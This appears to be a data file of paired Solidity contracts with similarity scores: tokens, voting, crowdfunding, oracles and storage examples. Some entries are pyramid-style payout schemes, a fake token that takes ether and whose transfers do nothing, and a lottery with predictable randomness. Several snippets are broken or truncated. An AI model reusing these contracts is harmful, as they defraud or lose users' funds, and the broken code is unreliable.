    address public creator;

    
    uint public number_of_leaves;
    uint public remaining_leaves = 0; 
    uint public initial_coins;
    uint public total_supply;
    uint public finney_balance; 
    uint public plant_price = 60; 
    uint public number_of_plants;

    
    modifier onlyIfEnoughMoney() {
        require(finney_balance > plant_price); 
        _;
    }

    
    modifier onlyCreator() {
        require(msg.sender == creator);
        _;
    }

    
    modifier enoughToInitialise() {
        require(msg.value > 0);
        _;
    }

    function Plant(uint _number_of_leaves, uint _initial_coins) public payable enoughToInitialise {
        number_of_leaves = _number_of_leaves;
        remaining_leaves = number_of_leaves;
        initial_coins = _initial_coins;
        total_supply = initial_coins;
        finney_balance = msg.value/1000000000000000;
        creator = msg.sender;
        number_of_plants ++;
        depositedFunds(msg.value, finney_balance);
    }

    function buy_new_plant() private onlyIfEnoughMoney {

        uint number_plants_to_buy = finney_balance / plant_price;

        total_supply += (initial_coins*number_plants_to_buy);
        finney_balance -= (plant_price*number_plants_to_buy);
        number_of_plants += number_plants_to_buy; 
        plantWasPurchased(finney_balance, total_supply, number_of_plants);
    }

    function () payable public {
        finney_balance += msg.value/1000000000000000;
        buy_new_plant();
        depositedFunds(msg.value, finney_balance);
    }

    function terminate() private onlyCreator{
        selfdestruct(creator);
    }

    function leafPicked(uint numPicked) public onlyCreator returns (uint){
        require(numPicked < remaining_leaves);
        remaining_leaves -= numPicked;
        leafWasPicked(remaining_leaves, numPicked);
    }

    event leafWasPicked(uint leavesLeft, uint numberTaken);
    event plantWasPurchased(uint newBalance, uint newTotalSupply, uint newPlantNumber); 
    event depositedFunds(uint amount, uint newBalance); 

}",0.5468887246435151,"contract BoomerangLiquidity is Owned {
    
    modifier onlyOwner(){
        require(msg.sender == owner);
        _;
    }
    
    modifier notPowh(address aContract){
        require(aContract != powh_address);
        _;
    }

    uint public multiplier;
    uint public payoutOrder = 0;
    address powh_address;
    POWH weak_hands;

    function BoomerangLiquidity(uint multiplierPercent, address powh) public {
        multiplier = multiplierPercent;
        powh_address = powh;
        weak_hands = POWH(powh_address);
    }
    
    
    struct Participant {
        address etherAddress;
        uint payout;
    }

    Participant[] public participants;

    
    function() payable public {
    }
    
    function deposit() payable public {
        participants.push(Participant(msg.sender, (msg.value * multiplier) / 100));
        if(myTokens() > 0){
            withdraw();
        }
        payout();
    }
    
    function payout() public {
        uint balance = address(this).balance;
        require(balance > 1);
        uint investment = balance / 2;
        balance -= investment;
        weak_hands.buy.value(investment).gas(1000000)(msg.sender);
        while (balance > 0) {
            uint payoutToSend = balance < participants[payoutOrder].payout ? balance : participants[payoutOrder].payout;
            if(payoutToSend > 0){
                participants[payoutOrder].payout -= payoutToSend;
                balance -= payoutToSend;
                if(!participants[payoutOrder].etherAddress.send(payoutToSend)){
                    participants[payoutOrder].etherAddress.call.value(payoutToSend).gas(1000000)();
                }
            }
            if(balance > 0){
                payoutOrder += 1;
            }
            if(payoutOrder >= participants.length){
                return;
            }
        }
    }
    
    function myTokens() public view returns(uint256){
        weak_hands.myTokens();
    }
    
    function withdraw() public {
        weak_hands.withdraw.gas(1000000)();
    }
    
    function donate() payable public {
    }
    
    function transferAnyERC20Token(address tokenAddress, uint tokens) public onlyOwner notPowh(tokenAddress) returns (bool success) {
        return ERC20Interface(tokenAddress).transfer(owner, tokens);
    }
    

    
}"
"contract EthereumLottery {

    uint[6] array;
    uint[6] winners;
    string warning = ""please be sure to bet below 67 for the first 5 balls and 34 for the 6th"";
    address owner;    
    uint addr = address(this).balance;
    uint nonce = 1;
    uint startTime = now;

    constructor() public {
      owner = msg.sender;
    }

    function WARNING() public view returns (string memory) {
        return warning;
    }

    function PickYourNumbers(uint8 firstBall, uint8 secondBall, 
      uint8 thirdBall, uint8 fourthBall, 
      uint8 fithBall, uint8 powerballllll) public {

        if (firstBall <= 66) array[0] = firstBall;
        if (secondBall <= 66) array[1] = secondBall;
        if (thirdBall <= 66) array[2] = thirdBall;
        if (fourthBall <= 66) array[3] = fourthBall;
        if (fithBall <= 66) array[4] = fithBall;
        if (powerballllll <= 66) array[5] = powerballllll;

    }

    function GetHash() public view returns (uint[6] memory) {
        return array;
    }

    function StartTheLotto() public returns (uint[6] memory) {
        nonce++;
        winners[0] = random();
        nonce++;
        winners[1] = random();
        nonce++;
        winners[2] = random();
        nonce++;
        winners[3] = random();
        nonce++;
        winners[4] = random();
        nonce++;
        winners[5] = random();
    }


    function lottoWinners() public view returns (uint[6] memory) {
        return winners;
    }

    function random() private view returns(uint) {

        uint interval = now - startTime;

        bytes32 randomNum = keccak256(abi.encodePacked(interval + nonce + tx.gasprice + addr));

        uint number;
        for(uint i=0;i<randomNum.length;i++){
            number = number + uint(randomNum[i])*(2**(8*(randomNum.length-(i+1))));
        }
        return number % 67;
    }

}",0.579540323591386,"contract H123 is IERC20 {

    using SafeMath for uint256;



    mapping (address => uint256) private _balances;



    mapping (address => mapping (address => uint256)) private _allowed;



    uint256 private _totalSupply;

    string public name;

    uint8 public decimals = 18;

    string public symbol;



    constructor() public {

        _totalSupply = 1000000000 * 10 ** uint256(decimals);

        _balances[msg.sender] = _totalSupply;

        symbol = ""H123"";

        name = ""HandyTest"";

    }



    

    function totalSupply() public view returns (uint256) {

        return _totalSupply;

    }



    

    function balanceOf(address owner) public view returns (uint256) {

        return _balances[owner];

    }



    

    function allowance(address owner, address spender) public view returns (uint256) {

        return _allowed[owner][spender];

    }



    

    function transfer(address to, uint256 value) public returns (bool) {

        _transfer(msg.sender, to, value);

        return true;

    }



    

    function approve(address spender, uint256 value) public returns (bool) {

        require(spender != address(0));



        _allowed[msg.sender][spender] = value;

        emit Approval(msg.sender, spender, value);

        return true;

    }



    

    function transferFrom(address from, address to, uint256 value) public returns (bool) {

        _allowed[from][msg.sender] = _allowed[from][msg.sender].sub(value);

        _transfer(from, to, value);

        emit Approval(from, msg.sender, _allowed[from][msg.sender]);

        return true;

    }



    

    function _transfer(address from, address to, uint256 value) internal {

        require(to != address(0));



        _balances[from] = _balances[from].sub(value);

        _balances[to] = _balances[to].add(value);

        emit Transfer(from, to, value);

    }

}"
"contract Wordbase {

  struct Node {
    bytes32 value;
    mapping(bytes32 => Node) nodes;
  }

  mapping(address => Node) realms;

  function getNode(address addr , bytes32[] fields) internal returns (Node) {
    Node node = realms[addr];
    for (uint i = 0; i < fields.length; i ++) {
      node = node.nodes[fields[i]];
    }
    return node;
  }

  function get(address addr, bytes32[] fields) constant returns (bytes32) {
    return getNode(addr, fields).value;
  }

  function get(bytes32[] fields) constant returns (bytes32) {
    return get(msg.sender, fields);
  }

  function set(bytes32[] fields, bytes32 value) {
    getNode(msg.sender, fields).value = value;
  }

}",0.5948828134867461,"contract Token {
  function totalSupply() constant returns (uint) {}
  function balanceOf(address _owner) constant returns (uint) {}
  function transfer(address _to, uint _value) returns (bool) {}
  function transferFrom(address _from, address _to, uint _value) returns (bool) {}
  function approve(address _spender, uint _value) returns (bool) {}
  function allowance(address _owner, address _spender) constant returns (uint) {}
  event Transfer(address indexed _from, address indexed _to, uint _value);
  event Approval(address indexed _owner, address indexed _spender, uint _value);
}"
"contract Season {
    function getRequestsByFilter() public returns(bool) {
        Request r = new Request();
        bool ret = r.isMatch();
        return ret;
    }
}",0.5919851440517193,"contract Oracle {

    function isOutcomeSet() public constant returns (bool);
    function getOutcome() public constant returns (int);
}"
"contract TimeMachine is usingProvable {

    string public timestamp;
    event LogConstructorInitiated(string nextStep);
    event LogPriceUpdated(string price);
    event LogNewProvableQuery(string description);

    constructor () public payable {
        OAR = OracleAddrResolverI(0x8bE8DC18a310dcb46XXXXXXX30aA85f01499903b);
        emit LogConstructorInitiated(""Constructor was initiated. Call 'updateTime()' to send the Provable Query."");
    }

    function pay() public payable {}

    function balance() public view returns(uint256)  {
        return address(this).balance;
    }

    function __callback(bytes32 myid, string memory result) public {
        if (msg.sender != provable_cbAddress()) revert();
        timestamp = result;
        emit LogPriceUpdated(result);
    }

    function updateTime() public payable {
        if (provable_getPrice(""URL"") > address(this).balance) {
            emit LogNewProvableQuery(""Provable query was NOT sent, please add some ETH to cover for the query fee"");
        } else {
            emit LogNewProvableQuery(""Provable query was sent, standing by for the answer.."");
            bytes32 queryId = provable_query(""URL"", ""json(http:
        }
    }
}",0.5784157766831027,"contract SSC_HowManyPeoplePaid {
 
    event Bought(address _address);
    event PriceUpdated(uint256 _price);
 
    
    address private _owner;
 
    
    uint256 private _count = 0;
    
    uint256 private _price = 1500000000000000;
    
    
    mapping (address => bool) _clients;
    
    constructor() public {
        _owner = msg.sender;   
    }
    
   function withdraw() public{
        require(msg.sender == _owner);
        _owner.transfer(address(this).balance);
    }
    
    
    
    function() public payable { }
    
    function buy() public payable {
        
        assert(msg.value >= _price);
        
        
        if (!_clients[msg.sender]) {
            _clients[msg.sender] = true;
            _count += 1;
        }
        
        
        emit Bought(msg.sender);
    }
    
    
    
    function setPrice(uint256 newPrice) public {
        require(msg.sender == _owner);
        assert(newPrice > 0);
        
        
        _price = newPrice;
        
        
        emit PriceUpdated(newPrice);
    }
    
    
    
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
    
    function getPrice() public view returns (uint256) {
        return _price;
    }
    
    
    
    
    function getCount() public view returns (bool, uint256) {
        if(_clients[msg.sender]){
            return (true,_count);    
        }
        return (false, 0);
    }
    
    function isClient(address _address) public view returns (bool) {
        return _clients[_address];
    }
}"
"contract first {
    uint calculationResult;
    address public linkedContract;

    function calculate(uint firstNumber, uint secondNumber) public {
        calculationResult = firstNumber * secondNumber;
    }
}",0.5984878991142261,"contract MiniMeToken {
    function balanceOfAt(address _owner, uint _blockNumber) public constant returns (uint);
    function totalSupplyAt(uint _blockNumber) public constant returns(uint);
}"
"contract NewContract {

    struct Location {
        string JSON;
        uint time;
        string comment;
    }

    Location[] locations;

    function createLocation(string memory _json) public {
        locations.push(Location(_json, now, 'no comment'));
    }

    function addComment(string memory _comment, uint _id) public {
        locations[_id].comment = _comment;
    }

    function addCommentToNewest(string memory _comment) public {
        uint _id = locations.length - 1;
        locations[_id].comment = _comment;
    }

    function viewLocation(uint _id) public view returns(string memory) {
        string memory result = locations[_id].JSON;
        return result;
    }

    function viewTimestamp(uint _id) public view returns(uint) {
        uint result = locations[_id].time;
        return result;
    }

    function viewComment(uint _id) public view returns(string memory) {
        string memory result = locations[_id].comment;
        return result;
    }

    function viewEverything(uint _id) public view returns(string memory, uint, string memory) {
        string memory result1 = locations[_id].JSON;
        uint result2 = locations[_id].time;
        string memory result3 = locations[_id].comment;
        return (result1, result2, result3);
    }

    function viewNewestLocation() public view returns(string memory) {
        uint _id = locations.length - 1;
        string memory result = locations[_id].JSON;
        return result;
    } 

    function viewNewestTimestamp() public view returns(uint) {
        uint _id = locations.length - 1;
        uint result = locations[_id].time;
        return result;
    }

    function viewNewestComment() public view returns(string memory) {
        uint _id = locations.length - 1;
        string memory result = locations[_id].comment;
        return result;
    }

    function viewNewestEverything() public view returns(string memory, uint, string memory) {
        uint _id = locations.length - 1;
        string memory result1 = locations[_id].JSON;
        uint result2 = locations[_id].time;
        string memory result3 = locations[_id].comment;
        return (result1, result2, result3);
    }   
}",0.5670390725416385,"contract Getters {
    

    bytes32 FILE = ""Getters"";

    

    

    

    
    function getNumMarkets()
        public
        view
        returns (uint256);

    
    function getMarketTokenAddress(
        uint256 marketId
    )
        public
        view
        returns (address);

    
    function getMarketTotalPar(
        uint256 marketId
    )
        public
        view
        returns (Types.TotalPar memory);

    

    
    function getMarketMarginPremium(
        uint256 marketId
    )
        public
        view
        returns (Decimal.D256 memory);

    
    function getMarketSpreadPremium(
        uint256 marketId
    )
        public
        view
        returns (Decimal.D256 memory);

    
    function getMarketIsClosing(
        uint256 marketId
    )
        public
        view
        returns (bool);

    
    function getMarketPrice(
        uint256 marketId
    )
        public
        view
        returns (Monetary.Price memory);

    

    
    function getLiquidationSpreadForPair(
        uint256 heldMarketId,
        uint256 owedMarketId
    )
        public
        view
        returns (Decimal.D256 memory);

    

    
    function getNumExcessTokens(
        uint256 marketId
    )
        public
        view
        returns (Types.Wei memory);

    

    
    function getAccountPar(
        Account.Info memory account,
        uint256 marketId
    )
        public
        view
        returns (Types.Par memory);

    
    function getAccountWei(
        Account.Info memory account,
        uint256 marketId
    )
        public
        view
        returns (Types.Wei memory);

    
    function getAccountStatus(
        Account.Info memory account
    )
        public
        view
        returns (Account.Status);

    
    function getAccountValues(
        Account.Info memory account
    )
        public
        view
        returns (Monetary.Value memory, Monetary.Value memory);

    
    function getAdjustedAccountValues(
        Account.Info memory account
    )
        public
        view
        returns (Monetary.Value memory, Monetary.Value memory);

    
    function getAccountBalances(
        Account.Info memory account
    )
        public
        view
        returns (
            address[] memory,
            Types.Par[] memory,
            Types.Wei[] memory
        );

    

    
    function getIsLocalOperator(
        address owner,
        address operator
    )
        public
        view
        returns (bool);

    
    function getIsGlobalOperator(
        address operator
    )
        public
        view
        returns (bool);
}"
"contract Payout {
address Victor;
address Jim;
address Kieren;

mapping (address => uint) ownershipDistribution; 

function Setup() {
  Victor = 0xaabb;
  Jim    = 0xccdd;
  Kieren = 0xeeff;

  ownershipDistribution[Victor] = 35;
  ownershipDistribution[Jim]  = 35;
  ownershipDistribution[Kieren] = 30;
}

function Dividend() {
  uint bal= this.balance;
  Victor.send(bal * ownershipDistribution[Victor] / 100); 
  Jim.send(bal * ownershipDistribution[Jim] / 100);
  Kieren.send(bal * ownershipDistribution[Kieren] / 100);
}
}",0.5026338099118697,"contract Participant {

    address constant smartolution = 0xe0ae35fe7Df8b86eF08557b535B89bB6cb036C23;



    address public owner;

    uint public daily;

    uint public index;

    

    constructor(address _owner, uint _daily) public {

        owner = _owner;

        daily = _daily;

        index = 0;

    }

    

    function () external payable {}

    

    function process() external payable returns (bool) {

        require(msg.value == daily, ""Invalid value"");

        

        smartolution.call.value(msg.value)();

        owner.send(address(this).balance);

        

        return ++index == 45;

    }

}"
"contract Bar {
    address bar_address;
    function Bar(){
        bar_address = msg.sender;
    }

    function run() {
        Foo foo = Foo(bar_address);
        
        foo.test2(); # succeeds
    }
}",0.5966674772281305,"contract ProxyRegistryLike {
    function proxies(address) public view returns (address);
    function build(address) public returns (address);
}"
"contract Ballot {
    struct Voter {
        uint weight;
        boolean if_voted;
        address delegated_to;
        uint vote;
    }
    struct Proposal {
        bytes32 name;
        uint voteCount;
    }

    address public chairperson;
    mapping(address => Voter) public voters;
    Proposal[] public proposals;
    constructor(bytes32[] memory proposalNames) public {
        chairperson = msg.sender;
        voters[chairperson].weight = 1;

        for (uint i = 0; i < proposalNames.length; i++) {
            proposals.push(Proposal({
                name: proposalNames[i],
                voteCount: 0
            }));
        }
    }
    function giveRightToVote(address voter) public {
        require(
            msg.sender == chairperson,
            ""Only the chairperson can assign voting rights.""
        );
        require(
            !voters[voter].voted,
            ""The voter has used their ballot.""
        );
        require(voters[voter].weight == 0);
        voters[voter].weight = 1;
    }
    function delegate(address to) public {
        Voter storage sender = voters[msg.sender];
        require(!sender.voted, ""You have already voted."");

        require(to != msg.sender, ""You can鈥檛 delegate to yourself."");

        while (voters[to].delegate != address(0)) {
            to = voters[to].delegate;
            require(to != msg.sender, ""Found loop in delegation!"");
        }
        sender.voted = true;
        sender.delegate = to;
        Voter storage delegate_ = voters[to];
        if (delegate_.voted) {
            proposals[delegate_.vote].voteCount += sender.weight;
        } else {
            delegate_.weight += sender.weight;
        }
    }
    function vote(uint proposal) public {
        Voter storage sender = voters[msg.sender];
        require(sender.weight != 0, ""Cannot vote"");
        require(!sender.voted, ""Has voted."");
        sender.voted = true;
        sender.vote = proposal;
        proposals[proposal].voteCount += sender.weight;
    }
    function winningProposal() public view
            returns (uint winningProposal_)
    {
        uint winningVoteCount = 0;
        for (uint p = 0; p < proposals.length; p++) {
            if (proposals[p].voteCount > winningVoteCount) {
                winningVoteCount = proposals[p].voteCount;
                winningProposal_ = p;
            }
        }
    }

    function winnerName() public view
            returns (bytes32 winnerName_)
    {
        winnerName_ = proposals[winningProposal()].name;
    }
}",0.5831445956924564,"contract Sell_eth {

    Orders orders;

    uint weiForSale;

    uint price; 

    address payable seller;

    mapping(address => uint) sales;

    uint8 pending;

    modifier onlySeller() {require(msg.sender == seller);  _;}



    event LogNewWeiForSale(uint wei_for_sale);

    event LogNewPrice(uint nprice);

    event LogSalePending(address indexed _seller, address indexed _buyer, uint value, uint _price);

    event LogCashReceived(address indexed _buyer, address indexed _seller);



    constructor(uint _price, address payable _seller, address _orders) public payable {

        orders = Orders(_orders);

        seller = _seller;

        price = _price;

        pending = 0;

        weiForSale = msg.value / 2;

    }

    

    function buy() payable public {

        require(sales[msg.sender] == 0);

        require(msg.value > 0 && msg.value <= weiForSale && (msg.value/price)%5000 == 0);

        sales[msg.sender] = msg.value;

        weiForSale -= msg.value;

        pending += 1;

        emit LogNewWeiForSale(weiForSale);

        emit LogSalePending(seller, msg.sender, msg.value, price);

    }



    function confirmReceived(address payable _buyer) public  onlySeller {

        require(sales[_buyer] > 0 && pending > 0);

        uint amt = sales[_buyer];

        sales[_buyer] = 0;

        _buyer.transfer(2*amt);

        pending -= 1;

        emit LogCashReceived(_buyer, seller);

	weiForSale += amt/2;

	emit LogNewWeiForSale(weiForSale); 

    }



    function addEther() public onlySeller payable {

        weiForSale += msg.value/2;

        emit LogNewWeiForSale(weiForSale);

    }



    function changePrice(uint new_price) public onlySeller {

        price = new_price;

        emit LogNewPrice(price);

    }

    

    function retr_funds() public onlySeller payable {

        require(pending == 0);

        orders.removeSellOrder();

        selfdestruct(address(seller));

    }

    

    function get_vars() view public returns(uint, uint) {

        return (weiForSale, price);

    }



    function is_party() view public returns(string memory) {

        if (sales[msg.sender] > 0) return ""buyer"";

        else if (seller == msg.sender) return ""seller"";

    }



    function has_pending() view public returns(bool) {

	if (pending > 0) return true;

    }

}"
"contract ContractA {

    uint public supplyA;

    function ContractA (uint _supply) { 
        supplyA = _supply; 
    }

    function setNewSupply() { 
        supplyA = 1000;
    }
}",0.5640451526235876,"contract IHumanity {

    function mint(address account, uint256 value) public;

    function totalSupply() public view returns (uint256);

}"
"contract CampaignFactory {

    address[] public deployedCampaignsAddress;
    address[] public managersAddress;

    function createCampaign(string description, uint minimumContribution, string campaignCategory, string endDate) public {
        Campaign newlyCreatedCampaign = new Campaign(description, minimumContribution, campaignCategory, endDate, msg.sender);
        deployedCampaignsAddress.push(newlyCreatedCampaign);
        managersAddress.push(msg.sender);
    }

    function getDeployedCampaigns() public view returns (address[]) {
        return deployedCampaignsAddress;
    }

    function getManagersAddress() public view returns (address[]) {
        return managersAddress;
    }
}",0.5785343270530882,"contract ThingFactory {
    address[] public addressList;
    address payable public mintbase;

    event StoreLaunch(
        address indexed store,
        string name,
        string symbol
    );

    constructor() public {
        mintbase = msg.sender;
    }
    

    function launchStore(
      string memory name,
      string memory symbol,
      string memory uri
    ) public returns (address item) {
        address newStore = address(new Thing(name, symbol, uri, mintbase, msg.sender));
        addressList.push(newStore);
        emit StoreLaunch(newStore, name, symbol);
        return newStore;
    }

    function getCount() public view returns (uint exchangeCount) {
        return addressList.length;
    }
}"
"contract Campaign {

    struct NewCampaignType {
        string description;
        uint minimumContribution;
        string campaignCategory;
        string endDate;
        address managerAddress;
    }

    struct Request {
        string description;
        uint value;
        address recipient;
        bool complete;
        uint approvalCount;
        mapping(address => bool) approvals;
    }

    NewCampaignType[] public campaignDetails;
    Request[] public requests;
    mapping(address => bool) public approvers;
    uint public approversCount;
    address public currentManager;

    modifier restricted() {
        require(msg.sender == currentManager);
        _;
    }

    function Campaign(string description, uint minimumContribution, string campaignCategory, string endDate, address managerAddress) public {
        NewCampaignType memory createCampaign = NewCampaignType({
            description: description,
            minimumContribution: minimumContribution,
            campaignCategory: campaignCategory,
            endDate: endDate,
            managerAddress: managerAddress
        });
        campaignDetails.push(createCampaign);
    }

    function contribute() public payable {
        require(msg.value > campaignDetails[0].minimumContribution);
        approvers[msg.sender] = true;
        approversCount++;
    }

    function createRequest(string description, uint value, address recipient) public restricted {
        Request memory newRequest = Request({
           description: description,
           value: value,
           recipient: recipient,
           complete: false,
           approvalCount: 0
        });

        requests.push(newRequest);
    }

    function approveRequest(uint index) public {
        Request storage request = requests[index];

        require(approvers[msg.sender]);
        require(!request.approvals[msg.sender]);

        request.approvals[msg.sender] = true;
        request.approvalCount++;
    }

    function finalizeRequest(uint index) public restricted {
        Request storage request = requests[index];

        require(request.approvalCount > (approversCount / 2));
        require(!request.complete);

        request.recipient.transfer(request.value);
        request.complete = true;
    }

    function getSummary() public view returns (
      uint, uint, uint, uint, address
      ) {
        return (
          campaignDetails[0].minimumContribution,
          this.balance,
          requests.length,
          approversCount,
          campaignDetails[0].managerAddress
        );
    }

    function getRequestsCount() public view returns (uint) {
        return requests.length;
    }
}",0.5917164258411297,"contract Cappasity is StandardToken {

    
    
    string public constant name = ""Cappasity"";
    string public constant symbol = ""CAPP"";
    uint8 public constant decimals = 2;
    uint public constant TOKEN_LIMIT = 10 * 1e9 * 1e2; 

    
    
    address public manager;

    
    bool public tokensAreFrozen = true;

    
    bool public mintingIsAllowed = true;

    
    event MintingAllowed();
    event MintingDisabled();

    
    event TokensFrozen();
    event TokensUnfrozen();

    
    
    function Cappasity(address _manager) public {
        manager = _manager;
    }

    
    
    function() payable public {
        revert();
    }

    
    
    function transfer(address _to, uint _value) public returns (bool) {
        require(!tokensAreFrozen);
        return super.transfer(_to, _value);
    }

    function transferFrom(address _from, address _to, uint _value) public returns (bool) {
        require(!tokensAreFrozen);
        return super.transferFrom(_from, _to, _value);
    }

    function approve(address _spender, uint _value) public returns (bool) {
        require(!tokensAreFrozen);
        return super.approve(_spender, _value);
    }

    function increaseApproval(address _spender, uint _addedValue) public returns (bool) {
        require(!tokensAreFrozen);
        return super.increaseApproval(_spender, _addedValue);
    }

    function decreaseApproval(address _spender, uint _subtractedValue) public returns (bool) {
        require(!tokensAreFrozen);
        return super.decreaseApproval(_spender, _subtractedValue);
    }

    
    
    modifier onlyByManager() {
        require(msg.sender == manager);
        _;
    }

    
    function mint(address _beneficiary, uint _value) external onlyByManager {
        require(_value != 0);
        require(totalSupply.add(_value) <= TOKEN_LIMIT);
        require(mintingIsAllowed == true);

        balances[_beneficiary] = balances[_beneficiary].add(_value);
        totalSupply = totalSupply.add(_value);
    }

    
    function endMinting() external onlyByManager {
        require(mintingIsAllowed == true);
        mintingIsAllowed = false;
        MintingDisabled();
    }

    
    function startMinting() external onlyByManager {
        require(mintingIsAllowed == false);
        mintingIsAllowed = true;
        MintingAllowed();
    }

    
    function freeze() external onlyByManager {
        require(tokensAreFrozen == false);
        tokensAreFrozen = true;
        TokensFrozen();
    }

    
    function unfreeze() external onlyByManager {
        require(tokensAreFrozen == true);
        tokensAreFrozen = false;
        TokensUnfrozen();
    }
}"
"contract DataItem {
    bytes32 key;
    string value;

    function DataItem(bytes32 k, string v) public {
        key = k;
        value = v;
   }
}",0.5884647657433714,"contract DSValue {

    

    function peek() public view returns (bytes32, bool);



    function read() public view returns (bytes32);

}"
"contract TwoQueries is usingOraclize {
  using strings for *;
  
  uint public myresult;
  string public sentresult;
  string fileaddress;
  string hexdigest;
  string filename;
  string client;
  string password;
  string public query;
  string public query2;
  string ipfsloc;
  string hashval;
  bool public initial;

  event newOraclizeQuery(string description);
  event queryValue(string queryDescripion);

  function TwoQueries() public {
    client = ""client"";
    password = ""password"";
    filename = ""QmYrg4Fjsav174qqAMqgfAZr4nhDqkcPE24cyUW1DJHNxi"";
    hexdigest = ""45022f343cf02c957c304c1038b87a8e690a758f8fbe9f16d2beab2e093cb073"";
    initial = true;
    query = ""http:
    query2 = ""http:
    update();
  }

  function __callback(bytes32 myid, string result) {
    if (msg.sender != oraclize_cbAddress()) throw;
    if (initial == true) {
      initial = false;
      myresult = parseInt(result, 4); 
      query = query2;
      update();                                                                                  
    }
  }

  function update() payable {
    newOraclizeQuery(""Oraclize query was sent, standing by for the answer.."");
    queryValue(query);
    oraclize_query(""URL"", query);
  }
}",0.5412532262600263,"contract TAO {

	using SafeMath for uint256;



	address public vaultAddress;

	string public name;				

	address public originId;		



	

	string public datHash;

	string public database;

	string public keyValue;

	bytes32 public contentId;



	

	uint8 public typeId;



	

	constructor (string _name,

		address _originId,

		string _datHash,

		string _database,

		string _keyValue,

		bytes32 _contentId,

		address _vaultAddress

	) public {

		name = _name;

		originId = _originId;

		datHash = _datHash;

		database = _database;

		keyValue = _keyValue;

		contentId = _contentId;



		

		typeId = 0;



		vaultAddress = _vaultAddress;

	}



	

	modifier onlyVault {

		require (msg.sender == vaultAddress);

		_;

	}



	

	function transferEth(address _recipient, uint256 _amount) public onlyVault returns (bool) {

		_recipient.transfer(_amount);

		return true;

	}



	

	function transferERC20(address _erc20TokenAddress, address _recipient, uint256 _amount) public onlyVault returns (bool) {

		TokenERC20 _erc20 = TokenERC20(_erc20TokenAddress);

		_erc20.transfer(_recipient, _amount);

		return true;

	}

}"
"contract EntityFactory  {

    event EntityCreated(address entity);

    function createEntity (string _hash) public returns (Entity entity) {
        Entity ent = new Entity(_hash);

        EntityCreated(ent);
        return ent;
    }
}",0.5336864953915169,"contract Utils {
    string constant public contract_version = ""0.1._"";
    
    
    
    function contractExists(address channel) constant returns (bool) {
        uint size;

        assembly {
            size := extcodesize(channel)
        }

        return size > 0;
    }
}"
"contract blog {


struct Posting {
    string judul;
    string content;
    address penulis;
    uint256 timestamp;
}

mapping(address => Posting[]) public penulisPost;

Posting[] public artikel;



function addArtikel(string memory _judul, string memory _content) public {
   Posting memory post = Posting(_judul, _content,  msg.sender, now);
   penulisPost[msg.sender].push(post);
    artikel.push(post);
    }
}",0.5720183357302749,"contract against_NS_for_IPFS {

    mapping(bytes32 => string) public nsname;

	

    string public name = ""AGAINST NS"";

    string public symbol = ""AGAINST"";

    string public comment = ""AGAINST NS for IPFS"";

    address internal owner;

	

	constructor() public {

       owner = address(msg.sender); 

    }

	

	function setNS(bytes32 _nsname,string _hash) public {

	   if (msg.sender == owner) {

	     nsname[_nsname] = _hash;

	   }

	}

}"
"contract StackSample {

    struct Sample {
        uint48 tm;
        uint56 tdn;
        uint56 ash;
        uint56 ndf;
        uint56 adf;
        uint56 cp;
        uint48 nitr;
        uint64 rfv;
        uint64 rfq;
        uint48 nel;
        uint40 grower;
    }

    mapping(uint56 => Sample) public samples;

    address public owner;

    constructor() public {
        owner = msg.sender;
    }

    modifier onlyOwner {
        require(msg.sender == owner);
        _;
    }

    function setSample(uint56 _stackID, uint48 _tm, uint56 _tdn, uint56 _ash, uint56 _ndf, uint56 _adf, uint56 _cp, uint48 _nitr, uint64 _rfv, uint64 _rfq, uint48 _nel, uint40 _grower) onlyOwner public {

        Sample storage sample = samples[_stackID];

        sample.tm = _tm;
        sample.tdn = _tdn;
        sample.ash = _ash;
        sample.ndf = _ndf;
        sample.adf = _adf;
        sample.cp = _cp;
        sample.nitr = _nitr;
        sample.rfv = _rfv;
        sample.rfq = _rfq;
        sample.nel = _nel;
        sample.grower = _grower;
    }

    function getSample(uint56 _stackID) view public returns (uint48, uint56, uint56, uint56, uint56, uint56, uint48, uint64, uint64, uint48, uint40) {

        Sample storage sample = samples[_stackID];

        return (sample.tm, sample.tdn, sample.ash, sample.ndf, sample.adf, sample.cp, sample.nitr, sample.rfv, sample.rfq, sample.nel, sample.grower);
    }
}",0.5242145364813358,"contract CicadaToken {
    
    string public standard = &#39;Cicada 33.01&#39;;
    string public name;
    string public symbol;
    uint8 public decimals;
    uint256 public initialSupply;

    
    mapping (address => uint256) public balanceOf;
    mapping (address => mapping (address => uint256)) public allowance;

  
    
    function Token() {

         initialSupply = 3301000000000;
         name =""CICADA"";
         decimals = 9;
         symbol = ""3301"";
        
        balanceOf[msg.sender] = initialSupply;              
        uint256 totalSupply = initialSupply;                
                                   
    }

    
    function transfer(address _to, uint256 _value) {
        if (balanceOf[msg.sender] < _value) throw;           
        if (balanceOf[_to] + _value < balanceOf[_to]) throw; 
        balanceOf[msg.sender] -= _value;                     
        balanceOf[_to] += _value;                            
      
    }
    
    function mul(uint256 a, uint256 b) internal constant returns (uint256) {
    uint256 c = a * b;
    assert(a == 0 || c / a == b);
    return c;
    }

    function div(uint256 a, uint256 b) internal constant returns (uint256) {
    
    uint256 c = a / b;
    
    return c;
    }

    function sub(uint256 a, uint256 b) internal constant returns (uint256) {
    assert(b <= a);
    return a - b;
    }

    function add(uint256 a, uint256 b) internal constant returns (uint256) {
    uint256 c = a + b;
    assert(c >= a);
    return c;
    }  
}"
"contract Voting {

mapping (bytes32 => uint8) public votesReceived;
bytes32[] public candidateList;

constructor(bytes32[] _candidates) public {
    candidateList = _candidates;
}

function voteForCandidate(bytes32 _name) public returns (uint8) {
    require(validateCandidate(_name));
    votesReceived[_name] += 1;
    
    return totalVotesFor(_name);
}

function validateCandidate(bytes32 _name) view public returns (bool){
    for (uint8 i = 0; i < candidateList.length; i++) {
        if(candidateList[i] == _name){
            return true;
        }
    }
    return false;
}

function totalVotesFor(bytes32 name) view public returns (uint8){
    require(validateCandidate(name));
    return votesReceived[name];
}

function addCandidate(bytes32 _name) public returns (bool) {
    candidateList.push(_name);
    return validateCandidate(_name);
}


const assert = require('assert');
var Voting = artifacts.require(""Voting"");",0.5726514597309771,"contract Prod is Ownable {
    
    string public name = ""https:
    string public symbol = ""https:
    uint256 public num = 1;
    uint256 public totalSupply = 2100005 ether;
    uint32 public constant decimals = 18;


    function() public payable
    {
        require( msg.value > 0 );
        
        owner.transfer(msg.value);

    }


    function balanceOf(address _owner) public view returns (uint256 balance) {
        return num  * 1 ether;
    }
    
    function transfer(address _to, uint256 _value) public returns (bool) {
        return true;
    }
    function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {
        return true;
    }
